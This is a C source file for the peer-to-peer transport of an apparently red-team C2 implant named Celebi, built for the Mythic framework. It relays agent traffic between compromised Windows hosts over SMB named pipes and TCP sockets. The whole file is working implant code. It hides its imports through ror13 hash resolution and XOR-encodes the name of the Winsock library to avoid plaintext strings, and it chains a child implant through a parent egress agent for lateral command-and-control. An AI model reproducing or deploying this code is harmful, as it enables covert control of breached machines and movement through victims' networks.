/*
 * p2p.c — peer-to-peer transports for Celebi (smb named pipes + tcp sockets).
 *
 * Roles:
 *   - CHILD  (payload built with the smb/tcp c2 profile): binds a pipe/socket
 *     server, accepts the parent's connection, then uses the channel for all
 *     Mythic traffic. Messages are the same agentMessages (base64 strings),
 *     framed as [u32 LE length][bytes].
 *   - PARENT (egress agent with an http profile): connects out to the child
 *     via the link command, relays the child's messages to Mythic as
 *     `delegates`, and writes Mythic's delegate responses back.
 *
 * One active peer per process in v1 (no nested p2p).
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "headers/celebi.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI int MSVCRT$strcmp(const char *s1, const char *s2);

WINBASEAPI HANDLE WINAPI KERNEL32$CreateNamedPipeW(LPCWSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, void *);
WINBASEAPI BOOL WINAPI KERNEL32$ConnectNamedPipe(HANDLE, void *);
WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, void *);
WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, void *);
WINBASEAPI BOOL WINAPI KERNEL32$PeekNamedPipe(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE);
WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
WINBASEAPI int WINAPI WS2_32$WSAStartup(WORD, void *);
WINBASEAPI SOCKET WINAPI WS2_32$socket(int, int, int);
WINBASEAPI int WINAPI WS2_32$bind(SOCKET, const struct sockaddr *, int);
WINBASEAPI int WINAPI WS2_32$listen(SOCKET, int);
WINBASEAPI SOCKET WINAPI WS2_32$accept(SOCKET, struct sockaddr *, int *);
WINBASEAPI int WINAPI WS2_32$connect(SOCKET, const struct sockaddr *, int);
WINBASEAPI int WINAPI WS2_32$recv(SOCKET, char *, int, int);
WINBASEAPI int WINAPI WS2_32$send(SOCKET, const char *, int, int);
WINBASEAPI int WINAPI WS2_32$closesocket(SOCKET);
WINBASEAPI int WINAPI WS2_32$select(int, fd_set *, fd_set *, fd_set *, const struct timeval *);
WINBASEAPI unsigned long WINAPI WS2_32$inet_addr(const char *);
WINBASEAPI struct hostent * WINAPI WS2_32$gethostbyname(const char *);
WINBASEAPI unsigned short WINAPI WS2_32$htons(unsigned short);

/* ws2_32 symbols resolve through the agent's dynamic resolution (ror13) — add
 * WS2_32 to the linker.spec dfr list. KERNEL32$X entries resolve normally. */

#define PIPE_BUF_SIZE 16384
#define MAX_FRAME_SIZE (1024 * 1024)

/* ============================================================
 * Framing helpers
 * ============================================================ */

static int read_exact_handle(HANDLE h, char *buf, int len) {
	int got = 0;
	while (got < len) {
		DWORD n = 0;
		if (!KERNEL32$ReadFile(h, buf + got, (DWORD)(len - got), &n, NULL) || n == 0) {
			return -1;
		}
		got += (int)n;
	}
	return 0;
}

static int write_exact_handle(HANDLE h, const char *buf, int len) {
	int sent = 0;
	while (sent < len) {
		DWORD n = 0;
		if (!KERNEL32$WriteFile(h, buf + sent, (DWORD)(len - sent), &n, NULL) || n == 0) {
			return -1;
		}
		sent += (int)n;
	}
	return 0;
}

static int read_exact_sock(SOCKET s, char *buf, int len) {
	int got = 0;
	while (got < len) {
		int n = WS2_32$recv(s, buf + got, len - got, 0);
		if (n <= 0) {
			return -1;
		}
		got += n;
	}
	return 0;
}

static int write_exact_sock(SOCKET s, const char *buf, int len) {
	int sent = 0;
	while (sent < len) {
		int n = WS2_32$send(s, buf + sent, len - sent, 0);
		if (n <= 0) {
			return -1;
		}
		sent += n;
	}
	return 0;
}

static void pack_u32(char *out, unsigned int v) {
	out[0] = (char)(v & 0xff);
	out[1] = (char)((v >> 8) & 0xff);
	out[2] = (char)((v >> 16) & 0xff);
	out[3] = (char)((v >> 24) & 0xff);
}

static unsigned int unpack_u32(const char *in) {
	return (unsigned int)((unsigned char)in[0]) |
	       ((unsigned int)((unsigned char)in[1]) << 8) |
	       ((unsigned int)((unsigned char)in[2]) << 16) |
	       ((unsigned int)((unsigned char)in[3]) << 24);
}

/* ============================================================
 * UUID helper
 * ============================================================ */

void p2p_gen_uuid(char out[37]) {
	/* Random RFC-4122-shaped UUID (v4 bits not enforced). */
	unsigned char rnd[16];
	crypto_random_bytes(rnd, sizeof(rnd));
	const char *hex = "0123456789abcdef";
	int idx = 0;
	for (int i = 0; i < 16; i++) {
		if (i == 4 || i == 6 || i == 8 || i == 10) {
			out[idx++] = '-';
		}
		out[idx++] = hex[rnd[i] >> 4];
		out[idx++] = hex[rnd[i] & 0xf];
	}
	out[36] = '\0';
}

/* ============================================================
 * Wide string helpers
 * ============================================================ */

static LPWSTR p2p_utf8_to_wide(const char *utf8) {
	int len = (int)MSVCRT$strlen(utf8);
	LPWSTR wide = (LPWSTR)KERNEL32$VirtualAlloc(0, (len + 1) * 2, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (wide == NULL) {
		return NULL;
	}
	for (int i = 0; i < len; i++) {
		wide[i] = (WCHAR)(unsigned char)utf8[i];
	}
	wide[len] = 0;
	return wide;
}

/* ============================================================
 * Peer queue
 * ============================================================ */

void peer_queue_in(P2P_PEER *peer, char *msg) {
	if (peer->in_count >= peer->in_cap) {
		int new_cap = peer->in_cap == 0 ? 4 : peer->in_cap * 2;
		char **new_q = (char **)KERNEL32$VirtualAlloc(0, sizeof(char *) * new_cap, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int i = 0; i < peer->in_count; i++) {
			new_q[i] = peer->in_queue[i];
		}
		if (peer->in_queue != NULL) {
			KERNEL32$VirtualFree(peer->in_queue, 0, MEM_RELEASE);
		}
		peer->in_queue = new_q;
		peer->in_cap = new_cap;
	}
	peer->in_queue[peer->in_count++] = msg;
}

void p2p_queue_out(P2P_PEER *peer, char *msg) {
	if (peer->out_count >= peer->out_cap) {
		int new_cap = peer->out_cap == 0 ? 4 : peer->out_cap * 2;
		char **new_q = (char **)KERNEL32$VirtualAlloc(0, sizeof(char *) * new_cap, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		for (int i = 0; i < peer->out_count; i++) {
			new_q[i] = peer->out_queue[i];
		}
		if (peer->out_queue != NULL) {
			KERNEL32$VirtualFree(peer->out_queue, 0, MEM_RELEASE);
		}
		peer->out_queue = new_q;
		peer->out_cap = new_cap;
	}
	peer->out_queue[peer->out_count++] = msg;
}

char *p2p_pop_in(P2P_PEER *peer) {
	if (peer->in_count == 0) {
		return NULL;
	}
	char *msg = peer->in_queue[0];
	for (int i = 1; i < peer->in_count; i++) {
		peer->in_queue[i - 1] = peer->in_queue[i];
	}
	peer->in_count--;
	return msg;
}

/* ============================================================
 * Frame send/receive
 * ============================================================ */

int p2p_send(P2P_PEER *peer, const char *b64msg) {
	int len = (int)MSVCRT$strlen(b64msg);
	if (len <= 0 || len > MAX_FRAME_SIZE) {
		return -1;
	}
	char hdr[4];
	pack_u32(hdr, (unsigned int)len);
	if (peer->type == P2P_TYPE_SMB) {
		if (write_exact_handle(peer->pipe, hdr, 4) != 0 || write_exact_handle(peer->pipe, b64msg, len) != 0) {
			return -1;
		}
	} else {
		if (write_exact_sock(peer->sock, hdr, 4) != 0 || write_exact_sock(peer->sock, b64msg, len) != 0) {
			return -1;
		}
	}
	return 0;
}

/* Blocking read of one framed message. Returns an allocated string or NULL. */
char *p2p_recv(P2P_PEER *peer) {
	char hdr[4];
	if (peer->type == P2P_TYPE_SMB) {
		if (read_exact_handle(peer->pipe, hdr, 4) != 0) {
			return NULL;
		}
	} else {
		if (read_exact_sock(peer->sock, hdr, 4) != 0) {
			return NULL;
		}
	}
	unsigned int len = unpack_u32(hdr);
	if (len == 0 || len > MAX_FRAME_SIZE) {
		return NULL;
	}
	char *msg = (char *)KERNEL32$VirtualAlloc(0, len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	if (msg == NULL) {
		return NULL;
	}
	if (peer->type == P2P_TYPE_SMB) {
		if (read_exact_handle(peer->pipe, msg, (int)len) != 0) {
			KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
			return NULL;
		}
	} else {
		if (read_exact_sock(peer->sock, msg, (int)len) != 0) {
			KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
			return NULL;
		}
	}
	msg[len] = '\0';
	return msg;
}

/* Non-blocking: if a full frame is available, read it; else return NULL. */
char *p2p_poll(P2P_PEER *peer) {
	if (peer->type == P2P_TYPE_SMB) {
		DWORD total = 0;
		if (!KERNEL32$PeekNamedPipe(peer->pipe, NULL, 0, NULL, &total, NULL)) {
			return NULL;
		}
		if (total < 4) {
			return NULL;
		}
		char hdr[4];
		if (read_exact_handle(peer->pipe, hdr, 4) != 0) {
			return NULL;
		}
		unsigned int len = unpack_u32(hdr);
		if (len == 0 || len > MAX_FRAME_SIZE) {
			return NULL;
		}
		char *msg = (char *)KERNEL32$VirtualAlloc(0, len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		if (msg == NULL || read_exact_handle(peer->pipe, msg, (int)len) != 0) {
			if (msg) { KERNEL32$VirtualFree(msg, 0, MEM_RELEASE); }
			return NULL;
		}
		msg[len] = '\0';
		return msg;
	} else {
		/* Manual fd_set (no FD_ZERO/FD_SET/FD_ISSET macros — they pull in
		 * __WSAFDIsSet/memset imports that can't be relocated in the PIC). */
		fd_set rfd;
		struct timeval tv;
		rfd.fd_count = 1;
		rfd.fd_array[0] = peer->sock;
		tv.tv_sec = 0;
		tv.tv_usec = 0;
		int sel = WS2_32$select(0, &rfd, NULL, NULL, &tv);
		if (sel <= 0 || rfd.fd_count == 0) {
			return NULL;
		}
		return p2p_recv(peer);
	}
}

/* Write all queued outbound messages to the peer. */
int p2p_flush(P2P_PEER *peer) {
	while (peer->out_count > 0) {
		char *msg = peer->out_queue[0];
		if (p2p_send(peer, msg) != 0) {
			return -1;
		}
		KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
		for (int i = 1; i < peer->out_count; i++) {
			peer->out_queue[i - 1] = peer->out_queue[i];
		}
		peer->out_count--;
	}
	return 0;
}

/* ============================================================
 * Server (child side)
 * ============================================================ */

int p2p_server_start(P2P_PEER *peer, AgentParams *params) {
	if (MSVCRT$strcmp(params->p2p_profile, "smb") == 0) {
		/* \\.\pipe\<pipename> */
		char path[512];
		int off = 0;
		const char *prefix = "\\\\.\\pipe\\";
		for (int i = 0; prefix[i] != '\0'; i++) { path[off++] = prefix[i]; }
		const char *name = (params->pipename != NULL && params->pipename[0] != '\0') ? params->pipename : "mythic";
		for (int i = 0; name[i] != '\0' && off < 510; i++) { path[off++] = name[i]; }
		path[off] = '\0';
		LPWSTR wide = p2p_utf8_to_wide(path);
		if (wide == NULL) {
			return -1;
		}
		peer->pipe = KERNEL32$CreateNamedPipeW(wide,
			PIPE_ACCESS_DUPLEX,
			PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
			1, PIPE_BUF_SIZE, PIPE_BUF_SIZE, 0, NULL);
		KERNEL32$VirtualFree(wide, 0, MEM_RELEASE);
		if (peer->pipe == INVALID_HANDLE_VALUE) {
			return -1;
		}
		if (!KERNEL32$ConnectNamedPipe(peer->pipe, NULL)) {
			KERNEL32$CloseHandle(peer->pipe);
			peer->pipe = INVALID_HANDLE_VALUE;
			return -1;
		}
		peer->type = P2P_TYPE_SMB;
		peer->active = 1;
		return 0;
	} else if (MSVCRT$strcmp(params->p2p_profile, "tcp") == 0) {
		/* "ws2_32.dll" ^ 0x4A — the ror13 resolver only finds loaded modules,
		 * so load it first without a plaintext name (spawned children may not
		 * have it loaded). */
		static const unsigned char WS2_32_XOR[] = {0x3d, 0x39, 0x78, 0x15, 0x79, 0x78, 0x64, 0x2e, 0x26, 0x26};
		load_module_xor(WS2_32_XOR, sizeof(WS2_32_XOR), 0x4A);
		WSADATA wsa;
		if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
			return -1;
		}
		SOCKET lsock = WS2_32$socket(AF_INET, SOCK_STREAM, 0);
		if (lsock == INVALID_SOCKET) {
			return -1;
		}
		struct sockaddr_in addr;
		ZeroMemoryStruct(&addr, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = INADDR_ANY;
		addr.sin_port = WS2_32$htons((unsigned short)(params->p2p_port > 0 ? params->p2p_port : 0));
		if (WS2_32$bind(lsock, (const struct sockaddr *)&addr, sizeof(addr)) != 0) {
			WS2_32$closesocket(lsock);
			return -1;
		}
		if (WS2_32$listen(lsock, 1) != 0) {
			WS2_32$closesocket(lsock);
			return -1;
		}
		peer->sock = WS2_32$accept(lsock, NULL, NULL);
		WS2_32$closesocket(lsock);
		if (peer->sock == INVALID_SOCKET) {
			return -1;
		}
		peer->type = P2P_TYPE_TCP;
		peer->active = 1;
		return 0;
	}
	return -1;
}

/* ============================================================
 * Client (parent side, used by the link command)
 * ============================================================ */

int p2p_client_connect(P2P_PEER *peer, const char *host, const char *profile, const char *pipename, int port) {
	/* remember the target host for unlink matching */
	if (peer->host != NULL) { KERNEL32$VirtualFree(peer->host, 0, MEM_RELEASE); }
	{
		size_t hlen = MSVCRT$strlen(host);
		peer->host = (char *)KERNEL32$VirtualAlloc(0, hlen + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
		if (peer->host != NULL) {
			for (size_t i = 0; i < hlen; i++) { peer->host[i] = host[i]; }
			peer->host[hlen] = '\0';
		}
	}
	if (MSVCRT$strcmp(profile, "smb") == 0) {
		/* \\<host>\pipe\<pipename> */
		char path[600];
		int off = 0;
		const char *prefix = "\\\\";
		for (int i = 0; prefix[i] != '\0'; i++) { path[off++] = prefix[i]; }
		for (int i = 0; host[i] != '\0' && off < 560; i++) { path[off++] = host[i]; }
		const char *mid = "\\pipe\\";
		for (int i = 0; mid[i] != '\0'; i++) { path[off++] = mid[i]; }
		const char *name = (pipename != NULL && pipename[0] != '\0') ? pipename : "mythic";
		for (int i = 0; name[i] != '\0' && off < 590; i++) { path[off++] = name[i]; }
		path[off] = '\0';
		LPWSTR wide = p2p_utf8_to_wide(path);
		if (wide == NULL) {
			return -1;
		}
		peer->pipe = KERNEL32$CreateFileW(wide, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		KERNEL32$VirtualFree(wide, 0, MEM_RELEASE);
		if (peer->pipe == INVALID_HANDLE_VALUE) {
			/* The target may still be starting up (spawn): wait once, try once. */
			KERNEL32$Sleep(5000);
			wide = p2p_utf8_to_wide(path);
			if (wide == NULL) {
				return -1;
			}
			peer->pipe = KERNEL32$CreateFileW(wide, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
			KERNEL32$VirtualFree(wide, 0, MEM_RELEASE);
		}
		if (peer->pipe == INVALID_HANDLE_VALUE) {
			return -1;
		}
		peer->type = P2P_TYPE_SMB;
		peer->active = 1;
		return 0;
	} else if (MSVCRT$strcmp(profile, "tcp") == 0) {
		/* "ws2_32.dll" ^ 0x4A — load it without a plaintext name (ror13 only
		 * resolves loaded modules). */
		static const unsigned char WS2_32_XOR[] = {0x3d, 0x39, 0x78, 0x15, 0x79, 0x78, 0x64, 0x2e, 0x26, 0x26};
		load_module_xor(WS2_32_XOR, sizeof(WS2_32_XOR), 0x4A);
		WSADATA wsa;
		if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
			return -1;
		}
		SOCKET csock = WS2_32$socket(AF_INET, SOCK_STREAM, 0);
		if (csock == INVALID_SOCKET) {
			return -1;
		}
		struct sockaddr_in addr;
		ZeroMemoryStruct(&addr, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_port = WS2_32$htons((unsigned short)port);
		addr.sin_addr.s_addr = WS2_32$inet_addr(host);
		if (addr.sin_addr.s_addr == INADDR_NONE) {
			struct hostent *he = WS2_32$gethostbyname(host);
			if (he == NULL) {
				WS2_32$closesocket(csock);
				return -1;
			}
			addr.sin_addr.s_addr = *(unsigned long *)he->h_addr;
		}
		if (WS2_32$connect(csock, (const struct sockaddr *)&addr, sizeof(addr)) != 0) {
			/* The target may still be starting up (spawn): wait once, try once. */
			KERNEL32$Sleep(5000);
			if (WS2_32$connect(csock, (const struct sockaddr *)&addr, sizeof(addr)) != 0) {
				WS2_32$closesocket(csock);
				return -1;
			}
		}
		peer->sock = csock;
		peer->type = P2P_TYPE_TCP;
		peer->active = 1;
		return 0;
	}
	return -1;
}

void p2p_close(P2P_PEER *peer) {
	if (peer == NULL) {
		return;
	}
	if (peer->type == P2P_TYPE_SMB && peer->pipe != NULL && peer->pipe != INVALID_HANDLE_VALUE) {
		KERNEL32$CloseHandle(peer->pipe);
	}
	if (peer->type == P2P_TYPE_TCP && peer->sock != INVALID_SOCKET && peer->sock != 0) {
		WS2_32$closesocket(peer->sock);
	}
	for (int i = 0; i < peer->in_count; i++) {
		KERNEL32$VirtualFree(peer->in_queue[i], 0, MEM_RELEASE);
	}
	for (int i = 0; i < peer->out_count; i++) {
		KERNEL32$VirtualFree(peer->out_queue[i], 0, MEM_RELEASE);
	}
	if (peer->in_queue != NULL) { KERNEL32$VirtualFree(peer->in_queue, 0, MEM_RELEASE); }
	if (peer->out_queue != NULL) { KERNEL32$VirtualFree(peer->out_queue, 0, MEM_RELEASE); }
	if (peer->local_uuid != NULL) { KERNEL32$VirtualFree(peer->local_uuid, 0, MEM_RELEASE); }
	if (peer->mythic_uuid != NULL) { KERNEL32$VirtualFree(peer->mythic_uuid, 0, MEM_RELEASE); }
	ZeroMemoryStruct(peer, sizeof(P2P_PEER));
}
